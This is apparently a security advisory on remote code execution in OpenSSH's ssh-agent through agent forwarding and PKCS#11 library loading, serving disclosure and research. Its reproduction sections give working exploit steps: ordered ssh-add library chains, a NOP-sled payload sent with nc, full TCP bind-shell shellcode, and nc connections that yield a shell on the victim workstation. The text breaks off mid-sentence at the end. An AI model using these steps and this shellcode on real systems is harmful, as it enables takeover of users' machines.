Summary
========================================================================

    "ssh-agent is a program to hold private keys used for public key
    authentication. Through use of environment variables the agent can
    be located and automatically used for authentication when logging in
    to other machines using ssh(1). ... Connections to ssh-agent may be
    forwarded from further remote hosts using the -A option to ssh(1)
    (but see the caveats documented therein), avoiding the need for
    authentication data to be stored on other machines."
    (<https://man.openbsd.org/ssh-agent.1>)

    "Agent forwarding should be enabled with caution. Users with the
    ability to bypass file permissions on the remote host ... can access
    the local agent through the forwarded connection. ... A safer
    alternative may be to use a jump host (see -J)."
    (<https://man.openbsd.org/ssh.1>)

Despite this warning, ssh-agent forwarding is still widely used today.
Typically, a system administrator (Alice) runs ssh-agent on her local
workstation, connects to a remote server with ssh, and enables ssh-agent
forwarding with the -A or ForwardAgent option, thus making her ssh-agent
(which is running on her local workstation) reachable from the remote
server.

While browsing through ssh-agent's source code, we noticed that a remote
attacker, who has access to the remote server where Alice's ssh-agent is
forwarded to, can load (dlopen()) and immediately unload (dlclose()) any
shared library in /usr/lib* on Alice's workstation (via her forwarded
ssh-agent, if it is compiled with ENABLE_PKCS11, which is the default).

(Note to the curious readers: for security reasons, and as explained in
the "Background" section below, ssh-agent does not actually load such a
shared library in its own address space (where private keys are stored),
but in a separate, dedicated process, ssh-pkcs11-helper.)

Although this seems safe at first (because every shared library in
/usr/lib* comes from an official distribution package, and no operation
besides dlopen() and dlclose() is generally performed by ssh-agent on a
shared library), many shared libraries have unfortunate side effects
when dlopen()ed and dlclose()d, and are therefore unsafe to be loaded
and unloaded in a security-sensitive program such as ssh-agent. For
example, many shared libraries have constructor and destructor functions
that are automatically executed by dlopen() and dlclose(), respectively.

Surprisingly, by chaining four common side effects of shared libraries
from official distribution packages, we were able to transform this very
limited primitive (the dlopen() and dlclose() of shared libraries from
/usr/lib*) into a reliable, one-shot remote code execution in ssh-agent
(despite ASLR, PIE, and NX). Our best proofs of concept so far exploit
default installations of Ubuntu Desktop plus three extra packages from
Ubuntu's "universe" repository. We believe that even better results can
be achieved (i.e., some operating systems might be exploitable in their
default installation):

- we only investigated Ubuntu Desktop 22.04 and 21.10, we have not
  looked into any other versions, distributions, or operating systems;

- the "fuzzer" that we wrote to test our ideas is rudimentary and slow,
  and we ran it intermittently on a single laptop, so we have not tried
  all the combinations of shared libraries and side effects;

- we initially had only one attack vector in mind (i.e., one specific
  combination of side effects from shared libraries), but we discovered
  six more while analyzing the results of our fuzzer, and we are
  convinced that more attack vectors exist.

In this advisory, we present our research, experiments, reproducible
results, and further ideas to exploit this "dlopen() then dlclose()"
primitive. We will also publish the source code of our crude fuzzer at
<https://www.qualys.com/research/security-advisories/> (warning: this code
might hurt the eyes of experienced fuzzing practitioners, but it gave us
quick answers to our many questions; it is provided "as is", in the hope
that it will be useful).

========================================================================
Background
========================================================================

The ability to load and unload shared libraries in ssh-agent was
developed in 2010 to support the addition and deletion of PKCS#11 keys:
ssh-agent forks and executes a long-running ssh-pkcs11-helper process
that dlopen()s PKCS#11 providers (shared libraries), and immediately
dlclose()s them if the symbol C_GetFunctionList cannot be found (i.e.,
if such a shared library is not actually a PKCS#11 provider, which is
the case for the vast majority of the shared libraries in /usr/lib*).

Note: ssh-agent also supports the addition of FIDO keys, by loading a
FIDO authenticator (a shared library) in a short-lived ssh-sk-helper
process; however, unlike ssh-pkcs11-helper, ssh-sk-helper is stateless
(it terminates shortly after loading a single shared library) and can
therefore not be abused by an attacker to chain the side effects of
several shared libraries.

Originally, the path of a shared library to be loaded in
ssh-pkcs11-helper was not filtered at all by ssh-agent, but in 2016 an
allow-list was added ("/usr/lib*/*,/usr/local/lib*/*" by default) in
response to CVE-2016-10009, which was published by Jann Horn (at
<https://bugs.chromium.org/p/project-zero/issues/detail?id=1009>):

- if an attacker had access to the server where Alice's ssh-agent is
  forwarded to, and had an unprivileged access to Alice's workstation,
  then this attacker could store a malicious shared library in /tmp on
  Alice's workstation and execute it with Alice's privileges (via her
  forwarded ssh-agent) -- a mild form of Local Privilege Escalation;

- if the attacker had only access to the server where Alice's ssh-agent
  is forwarded to, but could somehow store a malicious shared library
  somewhere on Alice's workstation (without access to her workstation),
  then this attacker could remotely execute this shared library (via
  Alice's forwarded ssh-agent) -- a mild form of Remote Code Execution.

Our first reaction was of course to try to bypass ssh-agent's /usr/lib*
allow-list:

- by finding a logic bug in the filter function, match_pattern_list()
  (but we failed);

- by making a path-traversal attack, for example /usr/lib/../../tmp (but
  we failed, because ssh-agent first calls realpath() to canonicalize
  the path of a shared library, and then calls the filter function);

- by finding a locally or remotely writable file or directory in
  /usr/lib* (but we failed).

Our only option, then, is to abuse side effects of the existing shared
libraries in /usr/lib*; in particular, their constructor and destructor
functions, which are automatically executed by dlopen() and dlclose().
Eventually, we realized that this is essentially a remote version of
CVE-2010-3856, which was published in 2010 by Tavis Ormandy (at
<https://seclists.org/fulldisclosure/2010/Oct/344>):

- an unprivileged local attacker could dlopen() any shared library from
  /lib and /usr/lib (via the LD_AUDIT environment variable), even when
  executing a SUID-root program;

- the constructor functions of various common shared libraries created
  files and directories whose location depended on the attacker's
  environment variables and whose creation mode depended on the
  attacker's umask;

- the local attacker could therefore create world-writable files and
  directories anywhere in the filesystem, and obtain full root
  privileges (via crond, for example).

Although the ability to load and unload shared libraries from /usr/lib*
in ssh-agent bears a striking resemblance to CVE-2010-3856, we are in a
much weaker position here, because we are trying to exploit ssh-agent
remotely, so we do not control its environment variables nor its umask
(and we do not even talk directly to ssh-pkcs11-helper, which actually
dlopen()s and dlclose()s the shared libraries: we talk to ssh-agent,
which canonicalizes and filters our requests before passing them on to
ssh-pkcs11-helper).

In fact, we do not control anything except the order in which we load
(and immediately unload) shared libraries from /usr/lib* in ssh-agent.
At that point, we almost abandoned our research, because we could not
possibly imagine how to transform this extremely limited primitive into
a one-shot remote code execution. Nevertheless, we felt curious and
decided to syscall-trace (strace) a dlopen() and dlclose() of every
shared library in the default installation of Ubuntu Desktop. We
instantly observed four surprising behaviors:

------------------------------------------------------------------------

1/ Some shared libraries require an executable stack, either explicitly
because of an RWE (readable, writable, executable) GNU_STACK ELF header,
or implicitly because of a missing GNU_STACK ELF header (in which case
the loader defaults to an executable stack): when such an "execstack"
library is dlopen()ed, the loader makes the main stack and all thread
stacks executable, and they remain executable even after dlclose().

For example, /usr/lib/systemd/boot/efi/linuxx64.elf.stub in the default
installation of Ubuntu Desktop 22.04.

------------------------------------------------------------------------

2/ Many shared libraries are marked as "nodelete" by the loader, either
explicitly because of a NODELETE ELF flag, or implicitly because they
are in the dependency list of a NODELETE library: the loader will never
unload (munmap()) such libraries, even after they are dlclose()d.

For example, /usr/lib/x86_64-linux-gnu/librt.so.1 in the default
installation of Ubuntu Desktop 22.04 and 21.10.

------------------------------------------------------------------------

3/ Some shared libraries register a signal handler for SIGSEGV when they
are dlopen()ed, but they do not deregister this signal handler when they
are dlclose()d (i.e., this signal handler is still registered when its
code is munmap()ed).

For example, /usr/lib/x86_64-linux-gnu/libSegFault.so in the default
installation of Ubuntu Desktop 21.10.

------------------------------------------------------------------------

4/ Some shared libraries crash with a SIGSEGV as soon as they are
dlopen()ed (usually because of a NULL-pointer dereference), because they
are supposed to be loaded in a specific context, not in a random program
such as ssh-agent.

For example, most of the /usr/lib/x86_64-linux-gnu/xtables/lib*.so in
the default installation of Ubuntu Desktop 22.04 and 21.10.

------------------------------------------------------------------------

And so an exciting idea to remotely exploit ssh-agent came into our
mind:

a/ make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack) by dlopen()ing one of the "execstack"
libraries ("surprising behavior 1/"), and somehow store a 1990-style
shellcode somewhere in this executable stack;

b/ register a signal handler for SIGSEGV and immediately munmap() its
code, by dlopen()ing and dlclose()ing one of the shared libraries from
"surprising behavior 3/" (consequently, a dangling pointer to this
unmapped signal handler is retained in the kernel);

c/ replace the unmapped signal handler's code with another piece of code
from another shared library, by dlopen()ing (mmap()ing) one of the
"nodelete" libraries ("surprising behavior 2/");

d/ raise a SIGSEGV by dlopen()ing one of the shared libraries from
"surprising behavior 4/", so that the unmapped signal handler is called
by the kernel, but the replacement code from the "nodelete" library is
executed instead (a use-after-free of sorts);

e/ hope that this replacement code (which is mapped where the signal
handler was mapped) is a useful gadget that somehow jumps into the
executable stack, exactly where our shellcode is stored.

========================================================================
Experiments
========================================================================

But "hope is not a strategy", so we decided to implement the following
6-step plan to test our remote-exploitation idea in ssh-agent:

------------------------------------------------------------------------

Step 1 - We install a default Ubuntu Desktop, download all official
packages from Ubuntu's "main" and "universe" repositories, and extract
all /usr/lib* files from these packages. These files occupy ~200GB of
disk space and include ~60,000 shared libraries.

Note: after the default installation of Ubuntu Desktop, but before the
extraction of all /usr/lib* files, we "chattr +i /etc/ld.so.cache" to
make sure that this file does not grow unrealistically (from kilobytes
to megabytes); indeed, it is mmap()ed by the loader every time dlopen()
is called, and a large file might therefore destroy the mmap layout and
prevent our fuzzer's results from being reproducible in the real world.

------------------------------------------------------------------------

Step 2 - For each shared library in /usr/lib*, we fork and execute
ssh-pkcs11-helper, strace it, and request it to dlopen() (and hence
immediately dlclose()) this shared library; if we spot anything unusual
in the strace logs (a raised signal, a clone() call, etc) or outstanding
differences in /proc/pid/maps or /proc/pid/status between before and
after dlopen() and dlclose(), then we mark this shared library as
interesting.

------------------------------------------------------------------------

Step 3 - We analyze the results of Step 2. For example, on Ubuntu
Desktop 22.04:

- 58 shared libraries make the stack executable when dlopen()ed (and the
  stack remains executable even after dlclose());

- 16577 shared libraries permanently alter the mmap layout when
  dlopen()ed (either because they are "nodelete" libraries, or because
  they allocate a thread stack or otherwise leak mmap()ed memory);

- 9 shared libraries register a SIGSEGV handler when dlopen()ed (but do
  not deregister it when dlclose()d), and 238 shared libraries raise a
  SIGSEGV when dlopen()ed;

- 2 shared libraries register a SIGABRT handler when dlopen()ed, and 44
  shared libraries raise a SIGABRT when dlopen()ed.

On Ubuntu Desktop 21.10:

- 30 shared libraries make the stack executable;

- 16172 shared libraries permanently alter the mmap layout;

- 9 shared libraries register a SIGSEGV handler, and 147 shared
  libraries raise a SIGSEGV;

- 2 shared libraries register a SIGABRT handler, and 38 shared libraries
  raise a SIGABRT;

- 1 shared library registers a SIGBUS handler, and 11 shared libraries
  raise a SIGBUS;

- 1 shared library registers a SIGCHLD handler, and 61 shared libraries
  raise a SIGCHLD;

- 1 shared library registers a SIGILL handler, and 1 shared library
  raises a SIGILL.

------------------------------------------------------------------------

Step 4 - We implement a rudimentary fuzzing strategy, by forking and
executing ssh-pkcs11-helper in a loop, and by loading (and unloading)
random combinations of the interesting shared libraries from Step 3:

a/ we randomly load zero or more shared libraries that permanently alter
the mmap layout, in the hope of creating holes in the mmap layout, thus
potentially shifting the replacement code (which will later replace the
signal handler's code) with page precision;

b/ we randomly load one shared library that registers a signal handler
but does not deregister it when dlclose()d (i.e., when munmap()ed);

c/ we randomly load zero or more shared libraries that alter the mmap
layout (again), thus replacing the unmapped signal handler's code with
another piece of code (a hopefully useful gadget) from another shared
library (a "nodelete" library);

d/ we randomly load one shared library that raises the signal that is
caught by the unmapped signal handler: the replacement code (gadget) is
executed instead, and if it jumps into the stack (a SEGV_ACCERR with a
RIP register that points to the stack, because we did not make the stack
executable in this Step 4), then we mark this particular combination of
shared libraries as interesting.

Surprise: we actually get numerous jumps to the stack in this Step 4,
usually because the signal handler's code is replaced by a "jmp REG",
"call REG", or "pop; pop; ret" gadget, and the "REG" or popped RIP
register happens to point to the stack at the time of the jump.

------------------------------------------------------------------------

Step 5 - We implement this extra step to test whether the interesting
combinations of shared libraries from Step 4 actually jump into our
shellcode in the stack, or into uncontrolled data in the stack:

a/ we make the stack executable, by randomly loading one of the
"execstack" libraries from Step 3;

b/ we store ~10KB of 0xcc bytes in the stack buffer "buf" of
ssh-pkcs11-helper's main() function: 10KB is the maximum message length
that we can send to ssh-pkcs11-helper (via ssh-agent), and on amd64 0xcc
is the "int3" instruction that generates a SIGTRAP when executed;

c/ we randomly replay one of the interesting combinations of shared
libraries from Step 4: if a SIGTRAP is generated while the RIP register
points to the stack, then there is a fair chance that ssh-pkcs11-helper
jumped into our shellcode (our 0xcc bytes) in the executable stack.

Surprise: we actually get many SIGTRAPs in the stack during this Step 5,
but to our great dismay, most of these SIGTRAPs are generated because
ssh-pkcs11-helper jumps into the stack, in the middle of a pointer that
is stored on the stack and that happens to contain a 0xcc byte because
of ASLR (i.e., not because ssh-pkcs11-helper jumps into our own 0xcc
bytes in the stack).

------------------------------------------------------------------------

Step 6 - We implement this extra step to eliminate the false positives
produced by Step 5:

a/ we repeatedly replay (N times) each combination of shared libraries
that generates a SIGTRAP in the stack: if N SIGTRAPs are generated out
of N replays, then there is an excellent chance that ssh-pkcs11-helper
does indeed jump into our shellcode (our 0xcc bytes) in the stack (and
not into random bytes that happen to be 0xcc because of ASLR);

b/ if this is confirmed by a manual check (with gdb for example), then
we achieved a reliable, one-shot remote code execution in ssh-agent,
despite the very limited primitive, and despite ASLR, PIE, and NX.

========================================================================
Results
========================================================================

In this section, we present the results of our experiments:

- Signal handler use-after-free (Ubuntu Desktop 22.04)
- Signal handler use-after-free (Ubuntu Desktop 21.10)
- Callback function use-after-free
- Return from syscall use-after-free
- Sigaltstack use-after-free
- Sigreturn to arbitrary instruction pointer
- _Unwind_Context type-confusion
- RCE in library constructor

========================================================================
Signal handler use-after-free (Ubuntu Desktop 22.04)
========================================================================

This was our original idea for remotely attacking ssh-agent, as
discussed at the end of the "Background" section and as implemented in
the "Experiments" section. In this subsection, we present one of the
various combinations of shared libraries that result in a reliable,
one-shot remote code execution in ssh-agent on Ubuntu Desktop 22.04.

------------------------------------------------------------------------

1a/ On our local workstation, we install a default Ubuntu Desktop 22.04
(<https://old-releases.ubuntu.com/releases/22.04/ubuntu-22.04-desktop-amd64.iso>),
without connecting this workstation to the Internet.

------------------------------------------------------------------------

1b/ After the installation is complete, we modify /etc/apt/sources.list
to prevent any package from being upgraded to a version that is not the
one that we used in our experiments:

workstation# cp -i /etc/apt/sources.list /etc/apt/sources.list.backup
workstation# grep ' jammy ' /etc/apt/sources.list.backup > /etc/apt/sources.list

------------------------------------------------------------------------

1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three shared libraries used in this particular attack against ssh-agent:

workstation# apt-get update
workstation# apt-get upgrade
workstation# apt-get --no-install-recommends install eclipse-titan
workstation# apt-get --no-install-recommends install libkf5sonnetui5
workstation# apt-get --no-install-recommends install libns3-3v5

------------------------------------------------------------------------

2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:

workstation$ id
uid=1000(alice) gid=1000(alice)
groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)

workstation$ eval `ssh-agent -s`
Agent pid 1105

workstation$ echo /tmp/ssh-*/agent.*
/tmp/ssh-XXXXXXmgHTo9/agent.1104

workstation$ ssh -A server

server$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)

server$ echo /tmp/ssh-*/agent.*
/tmp/ssh-N5EjHljGRh/agent.1299

------------------------------------------------------------------------

3/ Then, as a remote attacker who has access to this server:

------------------------------------------------------------------------

3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding (indeed,
the ssh-agent itself is running on Alice's workstation, not on the
server):

server# echo /tmp/ssh-*/agent.*
/tmp/ssh-N5EjHljGRh/agent.1299

server# export SSH_AUTH_SOCK=/tmp/ssh-N5EjHljGRh/agent.1299

server# ssh-add -s /usr/lib/systemd/boot/efi/linuxx64.elf.stub
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/systemd/boot/efi/linuxx64.elf.stub": agent refused operation

------------------------------------------------------------------------

3b/ we remotely store a shellcode in the stack buffer "buf" of
ssh-pkcs11-helper's main() function:

server#
SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'

server# (perl -e 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n
"$SHELLCODE") | nc -U "$SSH_AUTH_SOCK"
[Press Ctrl-C after a few seconds.]

- we do not use ssh-add here, because we want to send a ~10KB passphrase
  (our shellcode) to ssh-agent, but ssh-add limits the length of our
  passphrase to 1KB;

- "\x90" x 10000 is a ~10KB "NOP sled" (on amd64, 0x90 is the "nop"
  instruction);

- SHELLCODE is a "TCP bind shell" on port 31337 (from
  <https://shell-storm.org/shellcode/files/shellcode-858.html>);

- /usr/lib/modules is an existing directory whose path matches
  ssh-agent's /usr/lib* allow-list (indeed, we do not want to actually
  load a shared library here -- we just want to store our shellcode in
  the executable stack);

------------------------------------------------------------------------

3c/ we remotely register a SIGSEGV handler, and immediately munmap() its
code:

server# ssh-add -s /usr/lib/titan/libttcn3-rt2-dynamic.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/titan/libttcn3-rt2-dynamic.so": agent refused operation

------------------------------------------------------------------------

3d/ we remotely replace the unmapped SIGSEGV handler's code with another
piece of code (a useful gadget) from another shared library:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0": agent refused operation

------------------------------------------------------------------------

3e/ we remotely raise a SIGSEGV in ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libns3.35-wave.so.0.0.0
Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3f/ the replacement code (gadget) is executed (instead of the unmapped
SIGSEGV handler's code) and jumps to the stack, into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:

server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/*] succeeded!

workstation$ id
uid=1000(alice) gid=1000(alice)
groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)

workstation$ ps axuf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND

------------------------------------------------------------------------

To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGSEGV handler and that jumps into the
NOP sled of our shellcode (in the executable stack), we relaunch our
attack against ssh-agent and attach to ssh-pkcs11-helper with gdb:

========================================================================
Signal handler use-after-free (Ubuntu Desktop 21.10)
========================================================================

In this subsection, we present one of the various combinations of shared
libraries that result in a reliable, one-shot remote code execution in
ssh-agent on Ubuntu Desktop 21.10.

------------------------------------------------------------------------

1a/ On our local workstation, we install a default Ubuntu Desktop 21.10
(<https://old-releases.ubuntu.com/releases/21.10/ubuntu-21.10-desktop-amd64.iso>),
without connecting this workstation to the Internet.

------------------------------------------------------------------------

1b/ After the installation is complete, we modify /etc/apt/sources.list
to prevent any package from being upgraded to a version that is not the
one that we used in our experiments:

workstation# cp -i /etc/apt/sources.list /etc/apt/sources.list.backup
workstation# echo 'deb <https://old-releases.ubuntu.com/ubuntu/> impish main restricted universe' > /etc/apt/sources.list

------------------------------------------------------------------------

1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three extra shared libraries used in this attack against ssh-agent:

workstation# apt-get update
workstation# apt-get upgrade
workstation# apt-get --no-install-recommends install syslinux-common
workstation# apt-get --no-install-recommends install libgnatcoll-postgres1
workstation# apt-get --no-install-recommends install libenca-dbg

------------------------------------------------------------------------

2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:

workstation$ id
uid=1000(alice) gid=1000(alice)
groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)

workstation$ eval `ssh-agent -s`
Agent pid 912

workstation$ echo /tmp/ssh-*/agent.*
/tmp/ssh-GnpGKph6xbe3/agent.911

workstation$ ssh -A server

server$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)

server$ echo /tmp/ssh-*/agent.*
/tmp/ssh-30N8pjTKWn/agent.996

------------------------------------------------------------------------

3/ Then, as a remote attacker who has access to this server:

------------------------------------------------------------------------

3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding:

server# echo /tmp/ssh-*/agent.*
/tmp/ssh-30N8pjTKWn/agent.996

server# export SSH_AUTH_SOCK=/tmp/ssh-30N8pjTKWn/agent.996

server# ssh-add -s /usr/lib/syslinux/modules/efi64/gfxboot.c32
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/syslinux/modules/efi64/gfxboot.c32": agent refused operation

------------------------------------------------------------------------

3b/ we remotely store a shellcode in the stack of ssh-pkcs11-helper:

server#
SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'

server# (perl -e 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n
"$SHELLCODE") | nc -U "$SSH_AUTH_SOCK"
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3c/ we remotely alter the mmap layout of ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so": agent refused operation

------------------------------------------------------------------------

3d/ we remotely register a SIGBUS handler, and immediately munmap() its
code:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libgnatcoll_postgres.so.1
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/x86_64-linux-gnu/libgnatcoll_postgres.so.1": agent refused operation

------------------------------------------------------------------------

3e/ we remotely alter the mmap layout of ssh-pkcs11-helper (again), and
replace the unmapped SIGBUS handler's code with another piece of code (a
useful gadget) from another shared library:

server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-http-protocol-unix.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/sane/libsane-hp.so.1.0.32
server# ssh-add -s /usr/lib/libreoffice/program/libindex_data.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/gstreamer-1.0/libgstaudiorate.so
server# ssh-add -s /usr/lib/libreoffice/program/libscriptframe.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/libisccc-9.16.15-Ubuntu.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/libxkbregistry.so.0.0.0

------------------------------------------------------------------------

3f/ we remotely raise a SIGBUS in ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/debug/.build-id/15/c0bee6bcb06fbf381d0e0e6c52f71e1d1bd694.debug
Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3g/ the replacement code (gadget) is executed (instead of the unmapped
SIGBUS handler's code) and jumps to the stack, then into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:

server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/*] succeeded!

workstation$ id
uid=1000(alice) gid=1000(alice)
groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)

workstation$ ps axuf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
alice        912  0.0  0.0   6060  2312 ?        Ss   17:18   0:00 ssh-agent -s
alice        928  0.0  0.0   2872   956 ?        S    17:25   0:00  \_ [sh]
alice        953  0.0  0.0   7060  3068 ?        R    17:40   0:00      \_ ps axuf

------------------------------------------------------------------------

To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGBUS handler and that jumps into the
NOP sled of our shellcode (in the executable stack), we relaunch our
attack against ssh-agent and attach to ssh-pkcs11-helper with gdb:

workstation$ gdb /usr/lib/openssh/ssh-pkcs11-helper 1225

========================================================================
Callback function use-after-free
========================================================================

While analyzing the first results of our fuzzer, we noticed that some
combinations of shared libraries jump to the stack although they do not
register any signal handler or raise any signal; how is this possible?
On investigation, we understood that:

- a core library (for example, libgcrypt.so or libQt5Core.so) is loaded
  but not unloaded (munmap()ed) by dlclose(), because it is marked as
  "nodelete" by the loader;

- a shared library (for example, libgnunetutil.so or gammaray_probe.so)
  is loaded and registers a userland callback function with the core
  library (via gcry_set_allocation_handler() or qtHookData[], for
  example), but it does not deregister this callback function when
  dlclose()d (i.e., when its code is munmap()ed);

- another shared library is loaded (mmap()ed) and replaces the unmapped
  callback function's code with another piece of code (a useful gadget);

- yet another shared library is loaded and calls one of the core
  library's functions, which in turn calls the unmapped callback
  function and therefore executes the replacement code (the useful
  gadget) instead, thus jumping to the stack.

------------------------------------------------------------------------

In the following example, one of the core library's functions is called
at line 66254, the unmapped callback function is called at line 66288,
the replacement code (gadget) is executed instead at line 66289, and
jumps to the stack at line 66293 (ssh-pkcs11-helper segfaults here
because we did not make the stack executable):

Note: several shared libraries that are installed by default on Ubuntu
Desktop (for example, gkm-*-store-standalone.so) do not have constructor
or destructor functions, but they are actual PKCS#11 providers, so some
of their functions are explicitly called by ssh-pkcs11-helper, and these
functions register a callback function with libgcrypt.so but they do not
deregister it when dlclose()d (i.e., when munmap()ed), thus exhibiting
the "Callback function use-after-free" behavior presented in this
subsection.

In the following example, one of libgcrypt.so's functions is called at
line 79114, the unmapped callback function is called at line 79143, the
replacement code (gadget) is executed instead at line 79144, and jumps
to the stack at line 79157:

Return from syscall use-after-free
========================================================================

While analyzing the strace logs of the dlopen() and dlclose() of every
shared library in /usr/lib*, we spotted an unusual SIGSEGV:

- a shared library is loaded, and its constructor function starts a
  thread that sleeps for 10 seconds in kernel-land:

------------------------------------------------------------------------

------------------------------------------------------------------------

- meanwhile, the main thread (ssh-pkcs11-helper) unloads this shared
  library (because it is not an actual PKCS#11 provider) and therefore
  munmap()s the code where the sleeping thread should return to after
  its sleep in kernel-land:

------------------------------------------------------------------------
3631347 socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 3
3631347 connect(3, {sa_family=AF_UNIX, sun_path="/dev/log"}, 110) = 0

3631347 munmap(0x7f5f3c3fb000, 33296)   = 0
------------------------------------------------------------------------

- the sleeping thread returns from kernel-land and crashes with a
  SIGSEGV because its userland code (at 0x7f5f3c3fecff) was unmapped:

------------------------------------------------------------------------
3631372 <... clock_nanosleep resumed>0x7f5f3bd6fde0) = 0
3631372 --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7f5f3c3fecff} ---
------------------------------------------------------------------------

Of course, we can request ssh-pkcs11-helper to load (mmap()) a
"nodelete" library before the sleeping thread returns from kernel-land,
thus replacing the unmapped userland code with another piece of code (a
hopefully useful gadget). In the following example, the sleeping thread
returns from kernel-land after line 214, executes the replacement code
(gadget) at line 256, and jumps to the stack at line 1305:

------------------------------------------------------------------------
[585902.691238] signal: ssh-pkcs11-help[1663008] overflowed sigaltstack
------------------------------------------------------------------------

On investigation, we discovered that at least one shared library
(libgnatcoll_postgres.so) calls sigaltstack() to register an alternate
signal stack (used by SA_ONSTACK signal handlers) when dlopen()ed, and
then munmap()s this signal stack without deregistering it (SS_DISABLE)
when dlclose()d. Consequently, we implemented and tested a different
attack idea:

- we randomly load zero or more shared libraries that permanently alter
  the mmap layout;

- we load libgnatcoll_postgres.so, which registers an alternate signal
  stack and then munmap()s it without deregistering it;

- we randomly load zero or more shared libraries that alter the mmap
  layout (again), and hopefully replace the unmapped signal stack with
  another writable memory mapping (for example, a thread stack, or a
  .data or .bss segment);

- we randomly load one shared library that registers an SA_ONSTACK
  signal handler but does not munmap() its code when dlclose()d (unlike
  our original "Signal handler use-after-free" attack);

- we randomly load one shared library that raises this signal and
  therefore calls the SA_ONSTACK signal handler, thus overwriting the
  replacement memory mapping with stack frames from the signal handler;

- we randomly load one or more shared libraries that hopefully use the
